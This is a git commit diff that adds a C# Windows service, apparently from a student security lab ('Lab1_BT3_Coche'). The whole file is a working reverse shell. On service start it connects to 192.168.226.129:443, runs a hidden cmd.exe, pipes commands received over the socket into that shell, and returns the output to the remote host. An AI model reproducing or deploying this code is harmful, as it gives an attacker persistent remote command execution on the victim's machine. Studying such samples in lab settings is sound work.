83e421a89bd4e0191bfeeb60789a377d7c69a1b0
Kayiz-PT <74753555+Kayiz-PT@users.noreply.github.com>
2021-03-28 11:14:48 +0700

    Add files via upload

---
+++ Lab1_BT3_Coche/BT3_Coche/Service1.cs
@@ -0,0 +1,103 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Linq;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+using System.Net.Sockets;
+using System.IO;
+using System.Windows;
+
+namespace BT3_Coche
+{
+    public partial class Service1 : ServiceBase
+    {
+        public Service1()
+        {
+            InitializeComponent();
+        }
+        static StreamWriter streamWriter;
+
+        protected override void OnStart(string[] args)
+        {
+			
+			if (CheckForInternetConnection() == true)
+            {
+				ConnectBack();
+			}
+            else
+            {
+				MessageBox.Show("Internet Options!", "Check for your connection!", MessageBoxButton.OK);
+            }
+        }
+		private static bool CheckForInternetConnection()
+		{
+			try
+			{
+				using (var client = new WebClient())
+				using (client.OpenRead("https://www.google.com/"))
+					return true;
+			}
+			catch
+			{
+				return false;
+			}
+		}
+		private void ConnectBack()
+        {
+			using (TcpClient client = new TcpClient("192.168.226.129", 443))
+			{
+				using (Stream stream = client.GetStream())
+				{
+					using (StreamReader rdr = new StreamReader(stream))
+					{
+						streamWriter = new StreamWriter(stream);
+
+						StringBuilder strInput = new StringBuilder();
+
+						Process p = new Process();
+						p.StartInfo.FileName = "cmd.exe";
+						p.StartInfo.CreateNoWindow = true;
+						p.StartInfo.UseShellExecute = false;
+						p.StartInfo.RedirectStandardOutput = true;
+						p.StartInfo.RedirectStandardInput = true;
+						p.StartInfo.RedirectStandardError = true;
+						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+						p.Start();
+						p.BeginOutputReadLine();
+
+						while (true)
+						{
+							strInput.Append(rdr.ReadLine());
+							//strInput.Append("\n");
+							p.StandardInput.WriteLine(strInput);
+							strInput.Remove(0, strInput.Length);
+						}
+					}
+				}
+			}
+		}
+		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+		{
+			StringBuilder strOutput = new StringBuilder();
+
+			if (!String.IsNullOrEmpty(outLine.Data))
+			{
+				try
+				{
+					strOutput.Append(outLine.Data);
+					streamWriter.WriteLine(strOutput);
+					streamWriter.Flush();
+				}
+				catch (Exception err) { }
+			}
+		}
+		protected override void OnStop()
+        {
+        }
+    }
+}
